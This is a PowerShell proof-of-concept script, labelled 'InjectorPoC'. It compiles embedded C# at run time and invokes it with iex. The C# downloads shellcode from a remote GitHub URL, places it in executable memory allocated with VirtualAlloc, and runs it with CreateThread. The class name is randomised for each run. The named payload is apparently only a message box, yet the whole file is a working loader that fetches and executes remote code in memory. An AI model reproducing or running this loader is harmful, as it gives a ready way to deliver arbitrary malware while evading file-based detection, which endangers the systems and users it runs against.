$id = get-random
$code = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;

namespace InjectorPoC
{
    public class Program$id
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


        public static void Main()
        {
            byte[] shellcode;

            // download the shellcode
            WebClient client = new WebClient();
            using (MemoryStream stream = new MemoryStream(client.DownloadData("https://raw.githubusercontent.com/plackyhacker/msgbox/main/shellcode64.bin")))
            {
                shellcode = stream.ToArray();
            }

            // allocate and copy shellcode to the virtual memory space
            int size = shellcode.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, size);

            // create and wait for a new thread to execute
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
"@

Add-Type -TypeDefinition $code -Language CSharp
iex "[InjectorPoC.Program$id]::Main()"
